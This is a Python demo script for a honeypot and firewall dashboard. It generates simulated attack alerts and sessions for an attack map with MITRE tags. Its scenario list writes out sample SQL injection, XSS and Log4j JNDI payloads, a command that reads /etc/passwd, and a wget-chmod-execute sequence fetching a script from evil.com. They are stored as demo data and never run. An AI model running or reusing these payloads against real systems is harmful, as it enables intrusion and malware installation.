import asyncio
import random
import json
from datetime import datetime
from app.core.websockets import manager
from app.services.geo_service import geo_service
from app.services.mitre_service import mitre_service
from app.core.database import SessionLocal
from app.models.alert import Alert
from app.models.session import HoneypotSession

async def start_simulation():
    """
    Simulates background traffic, WAF events, and honeypot sessions.
    Generates data that populates the Attack Map and MITRE tags.
    """
    print("Starting Traffic Simulation (Demo Mode)...")
    
    # Attack Payloads & Commands for Demo
    scenarios = [
        {
            "type": "waf_bypass",
            "payload": "' OR '1'='1",
            "severity": "HIGH",
            "title": "SQL Injection Attempt",
            "desc": "Detected SQLi pattern in login form"
        },
        {
            "type": "waf_bypass",
            "payload": "<script>alert(1)</script>",
            "severity": "MEDIUM",
            "title": "XSS Attempt",
            "desc": "Cross-Site Scripting detected in search query"
        },
        {
            "type": "session",
            "commands": ["wget http://evil.com/malware.sh", "chmod +x malware.sh", "./malware.sh"],
            "title": "Malware Download"
        },
        {
            "type": "session",
            "commands": ["cat /etc/passwd", "whoami", "id"],
            "title": "Reconnaissance"
        },
        {
            "type": "waf_bypass",
            "payload": "${jndi:ldap://log4j.com/exploit}",
            "severity": "CRITICAL",
            "title": "Log4j RCE Attempt",
            "desc": "JNDI lookup pattern detected"
        }
    ]
    
    # Random global IPs for map distribution
    ips = [
        "1.1.1.1", "8.8.8.8", "203.0.113.1", "198.51.100.2", "45.33.22.11", 
        "185.199.108.153", "142.250.183.174", "93.184.216.34", "103.21.244.0"
    ]
    
    db = SessionLocal()

    while True:
        # Random delay between events (3-8 seconds for active demo)
        await asyncio.sleep(random.uniform(3, 8))
        
        scenario = random.choice(scenarios)
        ip = random.choice(ips)
        geo = geo_service.resolve_ip(ip) # Should return random/mock coordinates
        
        if scenario["type"] == "waf_bypass":
            # 1. Create DB Record
            alert = Alert(
                alert_type="waf_bypass",
                severity=scenario["severity"],
                title=scenario["title"],
                description=scenario["desc"],
                source_ip=ip,
                payload=scenario["payload"],
                latitude=geo["latitude"],
                longitude=geo["longitude"],
                country=geo["country"],
                timestamp=datetime.utcnow()
            )
            try:
                db.add(alert)
                db.commit()
            except Exception as e:
                print(f"Error saving alert: {e}")
                db.rollback()

            # 2. Broadcast WebSocket
            event = {
                "type": "waf_bypass",
                "payload": {
                    "source_ip": ip,
                    "payload": scenario["payload"],
                    "timestamp": datetime.utcnow().isoformat(),
                    "severity": scenario["severity"],
                    "country": geo["country"],
                    "latitude": geo["latitude"],
                    "longitude": geo["longitude"]
                },
                "timestamp": datetime.utcnow().isoformat()
            }
            await manager.broadcast(event)
            print(f"Simulated WAF Bypass: {scenario['title']} from {geo['country']}")

        elif scenario["type"] == "session":
            # Simulated completed session
            session_id = f"sess-{random.randint(1000, 9999)}"
            
            # Map commands to MITRE
            all_mitre = []
            for cmd in scenario["commands"]:
                techniques = mitre_service.map_command(cmd)
                all_mitre.extend(techniques)
            
            # Unique MITRE tags
            mitre_json = json.dumps([dict(t) for t in {tuple(d.items()) for d in all_mitre}])
            
            session = HoneypotSession(
                session_id=session_id,
                honeypot_type="shellm",
                source_ip=ip,
                start_time=datetime.utcnow(),
                commands_count=len(scenario["commands"]),
                threat_score=random.uniform(5.0, 10.0),
                latitude=geo["latitude"],
                longitude=geo["longitude"],
                country=geo["country"],
                mitre_techniques=mitre_json,
                commands=json.dumps([{"input": c, "output": "command not found" if "malware" not in c else "Downloading..."} for c in scenario["commands"]])
            )
            try:
                db.add(session)
                db.commit()
                print(f"Simulated Session: {session_id} with {len(all_mitre)} MITRE tags")
            except Exception as e:
                print(f"Error saving session: {e}")
                db.rollback()
